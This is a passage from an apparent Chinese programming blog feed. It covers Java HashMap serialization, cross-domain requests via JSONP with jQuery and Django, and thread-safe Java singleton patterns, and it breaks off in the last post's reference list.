class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>这意味着hashCode与底层相关，对于不同平台的虚拟机，会有不用的hashCode实现方式，也就是同一个对象在不同的平台下会有不同的hashcode值。</p><p>由于Java的跨平台特性，如果table不用transient修饰，在虚拟机A下的程序在虚拟机B下就会造成无法正常运行，这样就失去了其跨平台的意义，所以为了避免这样的情况，Java自己重写了其序列化table的方法，源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> buckets = capacity();</span><br><span class="line">    <span class="comment">// Write out the threshold, loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line">    s.writeInt(buckets);</span><br><span class="line">    s.writeInt(size);</span><br><span class="line">    internalWriteEntries(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal load factor: "</span> +</span><br><span class="line">                                            loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal mappings count: "</span> +</span><br><span class="line">                                            mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                    DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                    (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                    MAXIMUM_CAPACITY :</span><br><span class="line">                    tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                        (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">        <span class="meta">@SuppressWarnings</span>(&#123;<span class="string">"rawtypes"</span>,<span class="string">"unchecked"</span>&#125;)</span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h2><ul><li><a href="http://zhangshixi.iteye.com/blog/672697" target="_blank" rel="noopener">深入Java集合学习系列：HashMap的实现原理</a></li><li><a href="http://www.importnew.com/25049.html" target="_blank" rel="noopener">图解集合 4 ：HashMap</a></li><li><a href="https://tech.meituan.com/java-hashmap.html" target="_blank" rel="noopener">Java 8系列之重新认识HashMap</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 集合 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨域请求解决方法——jsonp</title>
      <link href="/CORS-JSONP/"/>
      <url>/CORS-JSONP/</url>
      
        <content type="html"><![CDATA[<p>Javascript出于安全方面的考虑，不允许跨域调用其他页面的对象，但这样却给平时的开发带来了不少麻烦，这里把涉及到跨域的问题进行了简单地整理。</p><h2 id="同源策略"><a class="markdownIt-Anchor" href="#同源策略"></a> 同源策略</h2><h3 id="什么是域origin"><a class="markdownIt-Anchor" href="#什么是域origin"></a> 什么是域（origin）</h3><p>域是由三部分组成：<code>URI Schema</code>（协议类型）、<code>host name</code>（域名）、<code>port number</code>（端口号），举个例子：</p><ul><li><code>http://www.a.com</code>这个页面，<code>URI Schema</code>是http，<code>host name</code>是<code>www.a.com</code>，<code>port number</code>是默认的80；</li><li><code>https://www.b.com:8080/test/</code>这个页面，<code>URI Schema</code>是https，<code>host name</code>是<code>www.b.com</code>，<code>port number</code>是8080。</li></ul><p>上面两个页面的三个部分全部不相同，所以它们就是不同的域。下面表格可以更好地看出什么是同域：</p><table><thead><tr><th>URL</th><th>说明</th><th>是否允许通信</th></tr></thead><tbody><tr><td><code>http://www.a.com/a.js</code><br><code>http://www.a.com/b.js</code></td><td>同一域名下</td><td>允许</td></tr><tr><td><code>http://www.a.com/lab/a.js</code><br><code>http://www.a.com/script/b.js</code></td><td>同一域名下不同文件夹</td><td>允许</td></tr><tr><td><code>http://www.a.com:8000/a.js</code><br><code>http://www.a.com/b.js</code></td><td>同一域名，不同端口</td><td>不允许</td></tr><tr><td><code>http://www.a.com/a.js</code><br><code>https://www.a.com/b.js</code></td><td>同一域名，不同协议</td><td>不允许</td></tr><tr><td><code>http://www.a.com/a.js</code><br><code>http://70.32.92.74/b.js</code></td><td>域名和域名对应ip</td><td>不允许</td></tr><tr><td><code>http://www.a.com/a.js</code><br><code>http://script.a.com/b.js</code></td><td>主域相同，子域不同</td><td>不允许</td></tr><tr><td><code>http://www.a.com/a.js</code><br><code>http://a.com/b.js</code></td><td>同一域名，不同二级域名（同上）</td><td>不允许</td></tr><tr><td><code>http://www.b.com/a.js</code><br><code>http://www.a.com/b.js</code></td><td>不同域名</td><td>不允许</td></tr></tbody></table><h3 id="同源策略-2"><a class="markdownIt-Anchor" href="#同源策略-2"></a> 同源策略</h3><p>它限制了某个域下的文档或者js与另一个域中的资源交互的方式，它提供了一种安全机制，这种安全机制可以避免来自恶意网站的攻击。同源策略要求浏览器允许来自某个网页上的js请求来自另一个网页的数据，当且仅当两个页面来自相同的域。</p><p>通过同源策略可以阻止来自恶意网站的脚本通过其他网站的DOM获取其他网站的信息。可以避免CSRF和XSS攻击。</p><ul><li>同源策略限制的是浏览器或者其他提供类似浏览器服务的软件，这只是一个规范，所以浏览器是否遵守这个规范也不一定，所以IE浏览器判断同源的时候就不必考虑端口号；</li><li>同源策略限制的js，而图片、css这些事不存在同源策略限制的</li></ul><h2 id="jsonp方式的原理"><a class="markdownIt-Anchor" href="#jsonp方式的原理"></a> jsonp方式的原理</h2><ul><li>浏览器的同源策略把跨域请求都禁止了</li><li>HTML的<code>&lt;script&gt;</code>标签是例外，可以突破同源策略从其他来源获取数据</li><li>我们可以通过<code>&lt;script&gt;</code>标签引入jsonp文件，然后通过一系列JS操作获取数据</li></ul><p>实现方法：通过页面中增加一个<code>&lt;script&gt;</code>标签，标签的<code>src</code>指向的是另外一个域的能够提供数据的url，同时将一个本地的<code>callback</code>方法传给服务端，服务端返回的时候将会自动指向<code>callback</code>方法。</p><p>1.通过JS在页面中append如下标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"application/javascript"</span> <span class="attr">src</span>=<span class="string">"http://www.b.com/test?callback=parseResponse"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>增加该标签之后，浏览器就会立即去请求这个url，由于<code>&lt;script src=&quot;&quot;&gt;</code>方式是不受同源策略限制的，可以避免跨域限制。</p><p>2.服务端收到callback参数之后，将它拼接在返回的数据中，返回的数据如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parseResponse(&#123;"name":"hax", "gender":"Male"&#125;);</span><br></pre></td></tr></table></figure><p>3.这样返回之后，就调用页面上的<code>parseResponse</code>方法，就达到了数据处理的目的。</p><p>4.最后将刚刚新增加到页面中的<code>&lt;script&gt;</code>元素删除。</p><h2 id="采用jsonp解决跨域问题"><a class="markdownIt-Anchor" href="#采用jsonp解决跨域问题"></a> 采用jsonp解决跨域问题</h2><p>由于本人技术水平有限，也在网上找了许多方案，但是大多没有成功（主要自己太菜了），最后结合了多个博客的讲解以及尝试，最后使用jsonp成功解决了自己遇到的问题，不过写这篇博客距离当时解决所隔时间太长，无法列出当时帮助到自己的大神们，求谅解。<br></p><p>由于后台采用了Django，故后台使用Python进行演示，其他的后台框架仿照完成即可。</p><h3 id="前端"><a class="markdownIt-Anchor" href="#前端"></a> 前端</h3><p>代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">submitComment</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">'GET'</span>,</span><br><span class="line">        url: url,</span><br><span class="line">        data: $(<span class="string">"#forml"</span>).serialize(),</span><br><span class="line">        crossDomain: <span class="literal">true</span>,</span><br><span class="line">        dataType: <span class="string">'jsonp'</span>,</span><br><span class="line">        jsonp: <span class="string">'callback'</span>,</span><br><span class="line">        jsonpCallback: <span class="string">'callback'</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">response</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(response);</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'Ajax error!'</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        complete: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"complete"</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上各参数详解：</p><table><thead><tr><th>参数名</th><th>参数类型</th><th>默认值</th><th>解析</th></tr></thead><tbody><tr><td>type</td><td>String</td><td>‘GET’</td><td>请求方式(‘POST’或’GET’)，其他HTTP请求方法，如PUT和DELETE也可使用，但是仅部分浏览器支持</td></tr><tr><td>url</td><td>String</td><td>当前页地址</td><td>发送请求地址</td></tr><tr><td>data</td><td>String</td><td></td><td>发送服务器的数据。将自动转换为请求字符串格式，其他详细解析课件w3school</td></tr><tr><td>crossDomain</td><td>Boolean</td><td>同域请求为false，跨域请求为true</td><td>若想在同一域内强制跨域请求(如jsonp形式)，例如，想让服务器重定向到另一个域，则需要将其设置为true</td></tr><tr><td>dataType</td><td>String</td><td></td><td>预期服务器返回的数据类型，详细可用值见下表</td></tr><tr><td>jsonp</td><td>String</td><td></td><td>在一个jsonp请求中重写回调函数的名字。这个值用来替代在&quot;callback=？&quot;这种GET或POST请求中的URL参数里的callback部分</td></tr><tr><td>jsonpCallback</td><td>String</td><td>jQuery自动生成的随机函数名</td><td>为jsonp请求指定回调函数名，用来取代自动生成的函数名，这样管理请求更容易，也能方便地提供回调函数和错误处理</td></tr><tr><td>success</td><td>Function</td><td></td><td>请求成功后的回调函数。有服务器返回，并根据dataType参数进行处理后的数据</td></tr><tr><td>error</td><td>Function</td><td></td><td>请求失败时调用此函数，具体可见w3school</td></tr><tr><td>complete</td><td>Function</td><td></td><td>请求完成后的回调函数(请求成功与失败都调用)，具体可见w3school</td></tr></tbody></table><p>dataType可用值表：</p><table><thead><tr><th>可用值</th><th>解析</th></tr></thead><tbody><tr><td>xml</td><td>返回XML文档，可用jQuery处理</td></tr><tr><td>html</td><td>返回纯文本HTML信息</td></tr><tr><td>script</td><td>返回纯文本JavaScript代码，不会自动缓存结果</td></tr><tr><td>json</td><td>返回json数据</td></tr><tr><td>jsonp</td><td>jsonp格式数据。使用JSONP形式调用函数时，如&quot;myurl?callback=?&quot;jQuery将自动替换?为正确的函数名，以执行回调函数</td></tr><tr><td>text</td><td>返回纯文本字符串</td></tr></tbody></table><p><strong>注意：</strong></p><ul><li>由于采用跨域请求，不管我们如何设置<code>type</code>参数，请求方式一定为<code>GET</code></li><li>开始调试时，每次在控制台都可以看到response，但是<code>success</code>的function就是没有调用，每次都是调用了<code>error</code>和<code>complete</code>的function，后来网上一直查，最终发现后台也需要相应的配合</li><li>由于不太明白<code>jsonp</code>与<code>jsonpCallback</code>参数的用法，所以直接将两个参数值赋一样的值</li></ul><h3 id="django后台"><a class="markdownIt-Anchor" href="#django后台"></a> Django后台</h3><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shop_comment</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="comment"># 以下是一些从请求中取出参数的操作</span></span><br><span class="line">    省略......</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = dict()</span><br><span class="line">        result[<span class="string">"returnInfo"</span>] = <span class="number">1</span></span><br><span class="line">        comment_list = list()</span><br><span class="line">        <span class="comment"># 以下代码是将数据库的操作，查到后append到comment_list里</span></span><br><span class="line">        省略......</span><br><span class="line">        result[<span class="string">"data"</span>] = comment_list</span><br><span class="line">        return_result = json.dumps(result)</span><br><span class="line">        data = <span class="string">'%s(%s);'</span> % (<span class="string">'callback'</span>, return_result)</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(data, <span class="string">'text/javascript'</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        data = <span class="string">'%s(%s);'</span> % (<span class="string">'callback'</span>, &#123;<span class="string">'result'</span>: e.message&#125;)</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(data, <span class="string">'text/javascript'</span>)</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ul><li>跨域请求方式都是<code>GET</code></li><li>返回一定要用HttpResponse，不能使用JsonResponse</li><li>开始当只有返回一个参数时，并没用使用<code>json.dumps()</code>方法，前台可以正常调用<code>success</code>的方法。后来当有多个参数时，前台就一直调用<code>error</code>和<code>complete</code>的方法，后来自己尝试使用了dumps之后，发现就正常了</li></ul><h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h2><ul><li><a href="http://www.w3school.com.cn/jquery/ajax_ajax.asp" target="_blank" rel="noopener">W3school的《jQuery ajax - ajax() 方法》</a></li><li><a href="http://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html" target="_blank" rel="noopener">Rain Man的《JavaScript跨域总结与解决办法》</a></li><li><a href="https://my.oschina.net/jasonultimate/blog/550737" target="_blank" rel="noopener">一条大河波浪宽的《ajax跨域请求原理及解决方案分析》</a></li><li><a href="https://segmentfault.com/a/1190000002799156" target="_blank" rel="noopener">别天的《JSONP原理及实现跨域方式》</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单例模式</title>
      <link href="/singleton-mode/"/>
      <url>/singleton-mode/</url>
      
        <content type="html"><![CDATA[<h2 id="单例模式的特点"><a class="markdownIt-Anchor" href="#单例模式的特点"></a> 单例模式的特点</h2><ul><li>单例类只能有一个实例</li><li>单例类必须创建自己唯一的实例</li><li>单例类必须给其他对象提供这一实例</li></ul><h2 id="饿汉-vs-懒汉"><a class="markdownIt-Anchor" href="#饿汉-vs-懒汉"></a> 饿汉 vs 懒汉</h2><ul><li>饿汉：声明实例引用时即实例化</li><li>懒汉：静态方法第一次被调用前不实例化，也即懒加载。对于创建实例代价大，且不定会使用时，使用懒加载可以减少开销</li></ul><h2 id="解决方案"><a class="markdownIt-Anchor" href="#解决方案"></a> 解决方案</h2><h3 id="在多线程环境中能工作但是效率不高不建议面试采用懒汉"><a class="markdownIt-Anchor" href="#在多线程环境中能工作但是效率不高不建议面试采用懒汉"></a> 在多线程环境中能工作，但是效率不高，不建议面试采用（懒汉）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Singleton1 &#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton1 instance;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton1 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> Singleton1();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：线程安全，可确保正常使用（不考虑通过反射调用私有构造方法），只有一个实例</li><li>缺点：每次获取实例都需要申请锁，开销大，效率低</li></ul><h3 id="加同步锁前后两次判断实例是否存在懒汉"><a class="markdownIt-Anchor" href="#加同步锁前后两次判断实例是否存在懒汉"></a> 加同步锁前后两次判断实例是否存在（懒汉）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton2</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton2 instance;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton2 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(Singleton2<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton2();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：不需要在每次调用时加锁，效率比上一个高</li><li>缺点：虽然使用了<code>synchronized</code>，但本质上是线程不安全的</li></ul><h3 id="双重检查double-check下的懒汉"><a class="markdownIt-Anchor" href="#双重检查double-check下的懒汉"></a> 双重检查（Double Check）下的懒汉</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton3</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton3 instance;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton3</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton3 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(Singleton3<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton3();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：使用了双重检查，避免了线程不安全，同时避免了不必要的锁开销</li><li>缺点：无</li><li><strong>注意：使用<code>volatile</code>关键字的目的不是保证可见性（<code>synchronized</code>已经保证了可见性），而是为了保证顺序性。具体来说，<code>instance = new Singleton3()</code>不是原子操作，实际上被拆分为了三步：1) 分配内存；2) 初始化对象；3) 将<code>instance</code>指向分配的对象内存地址。 如果没有<code>volatile</code>，可能会发生指令重排序，使得<code>instance</code>先指向内存地址，而对象尚未初始化，其它线程直接使用<code>instance</code>引用进行对象操作时出错。详细原理可参见《<a href="http://www.infoq.com/cn/articles/double-checked-locking-with-delay-initialization" target="_blank" rel="noopener" title="双重检查锁定与延迟初始化">双重检查锁定与延迟初始化</a>》</strong></li></ul><h3 id="利用静态变量饿汉"><a class="markdownIt-Anchor" href="#利用静态变量饿汉"></a> 利用静态变量（饿汉）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton4</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton4 instance = <span class="keyword">new</span> Singleton4();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton4 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：实现简单，无线程同步问题</li><li>缺点：在类装载时完成实例化。若该实例一直未被使用，则会造成资源浪费</li></ul><h3 id="利用静态代码块饿汉"><a class="markdownIt-Anchor" href="#利用静态代码块饿汉"></a> 利用静态代码块（饿汉）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton5</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton5 instance;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton5</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        instance = <span class="keyword">new</span> Singleton5();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton5 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：实现简单，无线程同步问题</li><li>缺点：在类装载时完成实例化。若该实例一直未被使用，则会造成资源浪费</li></ul><h3 id="实现按需创建实例强烈推荐懒汉"><a class="markdownIt-Anchor" href="#实现按需创建实例强烈推荐懒汉"></a> 实现按需创建实例（强烈推荐）（懒汉）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton6</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Nested</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> Singleton6 instance = <span class="keyword">new</span> Singleton6();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton6 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Nested.instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>优点：无线程同步问题，实现了懒加载。因为只有调用<code>getInstance()</code>时才会装载内部类，才会创建实例。同时因为使用内部类，先调用内部类的线程会获得类初始化锁，从而保证内部类的初始化（包括实例化它所引用的外部类对象）线程安全。即使内部类创建外部类的实例<code>Singleton6 instance = new Singleton6()</code>发生指令重排也不会引起双重检查下的懒汉模式中提到的问题，因此无须使用<code>volatile</code>关键字。</li><li>缺点：无</li></ul><h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h2><hr /><ul><li><a href="http://www.cnblogs.com/java-my-life/archive/2012/03/31/2425631.html" target="_blank" rel="noopener">java_my_life的《JAVA与模式》之单例模式</a></li><li><a href="http://www.jasongj.com/design_pattern/singleton/" target="_blank" rel="noopener">技术世界的Java设计模式（十） 你真的用对单例模式了吗？</a></li><li><a 